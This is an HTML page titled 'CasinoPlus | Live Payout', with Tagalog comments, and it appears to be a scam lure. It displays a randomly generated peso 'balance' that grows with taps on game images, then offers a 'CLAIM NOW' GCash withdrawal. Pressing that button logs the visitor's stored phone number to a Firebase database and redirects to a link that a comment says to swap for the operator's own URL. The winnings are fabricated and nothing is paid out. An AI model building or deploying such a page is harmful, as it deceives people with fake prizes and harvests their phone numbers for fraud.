<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CasinoPlus | Live Payout</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="js/config.js"></script>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="card">
        <img src="images/logo1.png" style="width:120px">
        <div class="game-grid" id="grid"></div> <div style="font-size: 11px; color: #fbbf24;">AVAILABLE BALANCE</div>
        <div class="amount" id="balanceDisplay">₱0.00</div>
        
        <button class="pay-button" id="claimBtn" onclick="redirectToGCash()" disabled>Withdraw via GCash</button>
    </div>

    <script>
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        let balance = [150, 200, 350][Math.floor(Math.random()*3)];
        let clicks = 0;
        const animations = ['move-goddess', 'move-monkey', 'move-zeus', 'move-bear', 'move-dress', 'move-boxer'];

        // Pag-load ng Grid
        const grid = document.getElementById('grid');
        for(let i=1; i<=6; i++) {
            grid.innerHTML += `
                <div class="card-wrapper" onclick="handleTap(this, ${i-1})">
                    <img src="images/img${i}.png" class="card-img" id="img-${i}">
                </div>`;
        }
        document.getElementById('balanceDisplay').innerText = "₱" + balance + ".00";

        function handleTap(el, index) {
            if (clicks >= 5 || el.classList.contains('card-disabled')) return;
            
            clicks++;
            const img = el.querySelector('img');
            const move = animations[index]; // Assign specific move per card
            
            img.classList.add(move);
            balance += 25;
            document.getElementById('balanceDisplay').innerText = "₱" + balance + ".00";

            setTimeout(() => {
                img.classList.remove(move);
                el.classList.add('card-disabled');
            }, 600);

            if (clicks === 5) {
                const btn = document.getElementById('claimBtn');
                btn.disabled = false;
                btn.innerText = "CLAIM ₱" + balance + " NOW";
            }
        }

        function redirectToGCash() {
            // Log sa Firebase bago mag-redirect
            db.ref('payouts/').push({ phone: localStorage.getItem('userPhone'), amount: balance });
            window.location.href = "https://www.gcash.com/"; // Palitan ng iyong ViaLink URL
        }
    </script>
</body>
</html>
